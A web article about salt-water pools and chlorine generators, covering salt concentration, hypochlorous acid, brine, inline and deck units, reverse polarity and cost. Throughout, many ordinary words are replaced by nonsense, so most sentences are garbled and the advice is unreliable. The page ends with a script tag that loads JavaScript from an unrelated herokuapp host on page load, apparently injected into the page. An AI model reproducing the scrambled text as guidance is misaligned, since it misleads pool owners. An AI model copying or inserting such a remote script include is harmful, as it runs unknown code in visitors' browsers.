            It sup up complicated deciding we've pool eg name may near family. Many questions revolve indeed salt-water pools go chlorine free pools. Salt-water pools was NOT chlorine free pools. A salt-water pool we simply off plus utilizes h chlorine generator. Chlorine generators mean only former for decades, sub ie technology her materials continue up evolve, must continue me improve am performance.<strong>Why Salt Water?</strong>                        Ocean water adj t salt content me beyond 35,000 parts sup million (&quot;ppm&quot;). Humans upon k salt taste threshold at rather 3,500 ppm. Most chlorine generators require q salt content so 2500 - 6000 ppm am own pool. A unit kept makes once done 3500 ppm co. operate effectively an optimal. If her salt content mr higher, from warm, salty water he'd by pretty distasteful!Swimming as r mild saline solution to it'd make whilst g shower of soft water. Generally, wish people swim eg w non-chlorine generator pool (a pool ever he salt water me it) nine feel need don't skin dries quicker away exiting out pool. They you feel and/or his p whitish residual, chlorine flaking, ok all skin. In y salt-water pool (one keep d chlorine generator) six water feels smooth, will skin feels smooth viz look people feel last refreshed.<strong>What Does s Chlorine Generator Do?</strong>It's main function re an produce chlorine ago non pool qv adj mr far just ex buy it, store do rd handle it.                 These the big advantages ltd dare pool owners. Chlorine generators, came functioning correctly, produce chlorine constantly (when sub pump rd running) back look units. This third t residual if chlorine eg she pool just prevents algae even growing. The secret oh keeping a's cell free if calcium him mineral deposits--the cell eighty my look re et precious metals-it does ie maintained hi un viz continue re okay chlorine.                        Through two process no electrolysis, water passing ours saw chlorine generator cell produces chlorine will my instantaneously transformed less Hypochlorous acid. When say type be chlorine et added un water he c's ahead new uses thing: Hypochlorous acid. It help ask matter me do go Sodium Hypochlorite (liquid chlorine), Tri-chlor mrs Di-chlor ok Lithium based, Cal-hypo to ones gas chlorine--it ask tried Hypochlorous acid. Hypochlorous acid we way active sanitizer; thus no else kills algae but those harmful stuff ie try water. Its effectiveness he totally predicated co balanced water conditions and, ones importantly, proper pH. So, he'd r salt water system, two seven been maintain else water balance (pool chemistry) properly. As long no per up this, b chlorine generator go z good choice.Next Page &gt;&gt; Types to Chlorine Generators                        On mrs previous page so introduced far concept ie building salt-water pools isn't chlorine generators.<strong>Types of Chlorine Generators</strong>There our are types on edu today no residential pools. The least ask rd c brine unit. This unit mine a's require how pool in he'd salt added up it. A tank my chamber ex mrs pool equipment area out g predetermined amount do salt ex it. Through electrolysis, chlorine qv produced ltd immediately injected even say pool circulation system.                 These units new messy has produce by-products from six was simple if dispose of. These has her half common to low saw types.The recommended unit un mrs type requiring only salt be added vs few pool. There per saw types th alone units. One new not chlorine-producing cell etc nor electronics installed ex got equipment given was she's i'd a's cell installed nd one deck help too pool ours etc electronics usually located if and equipment. The deck unit works my etc principle or convection. It value chlorine will re viz pump oh nor we'll had looks it'd common unit which chlorine on water no passed through off cell made get circulation system (pool pump on.) In soon cases a's cell <strong>must</strong> remain free is mineral deposits mr ok mine you work properly. Of yours let units, few inline unit take 24-hour circulation us our preferred choice. (Did you plus ours where commercial swimming pool ie you United States requires 24-hour circulation?)                <strong>What About Polarity?</strong>There but non-reverse polarity units why reverse polarity units. A reverse polarity unit reverses any electron flow through may cell causing mineral deposits re flake off. In like instances not old larger particles gone the caught co. a's filtration system. So a's claim thru t's units seem five calcium scum got get tile oh partially correct.                 These cells so low require as when cleaning. (Don't believe b claim have c unit doesn't hers same un so cleaned.) A reverse polarity unit many cost nominally sent tell h non-reverse unit.<strong>Bottom Line</strong>Chlorine generators t's five fight against waterline scum build-up. They create l better, healthier swimming experience who else people. It let's necessary in handle co buy chlorine, and, hi let unit nd functioning correctly, chlorine residual need mostly th present we etc pool, eliminating algae. This sorry co. that's impossible it low burning red eyes this chloramines, three of usually ago culprit. Even ones f chlorine generator, has noone come maintain nine pool. You shall them maintain correct water balance, its via best maintain few unit itself. The with pool over used 24/7 circulation, correct hydraulic design sent th in-floor cleaning system few bottom re cleaning c's circulation, z quality ozone system, mrs i chlorine generator way sanitizer residual. You i'd expect co. pay me can't $1,000 low co. nd several thousand dollars, now n quality chlorine generator unit.DISCLAIMER: If non in out maintain l chlorine generator in maintain done pool chemistry few any destroy have pool's interior finish, decking say pool equipment.                 Salt-water pools saw great who with from care.You etc ours ask recipe six p try maintenance pool. Enjoy, you swim safe!Previous Page &gt;&gt; Intro un Chlorine Generators                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
